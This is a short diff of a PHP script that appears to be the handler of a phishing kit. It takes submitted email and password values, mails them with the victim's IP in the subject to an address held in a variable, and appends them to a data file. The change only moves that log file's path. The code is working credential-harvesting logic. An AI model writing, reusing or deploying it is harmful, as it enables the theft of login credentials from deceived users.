@@ -19,8 +19,8 @@ if($email != "" || $password != "" ){
 	$subject = "RES : $ip";
     	mail($send, $subject, $message); 
     	$data = "\n".$message;
-		chmod("../data.txt", 0755); 
-		$fp = fopen('../data.txt', 'a+');
+		chmod("data.txt", 0755); 
+		$fp = fopen('data.txt', 'a+');
 		fwrite($fp, $data);
 		fclose($fp);
 	$signal ='ok';
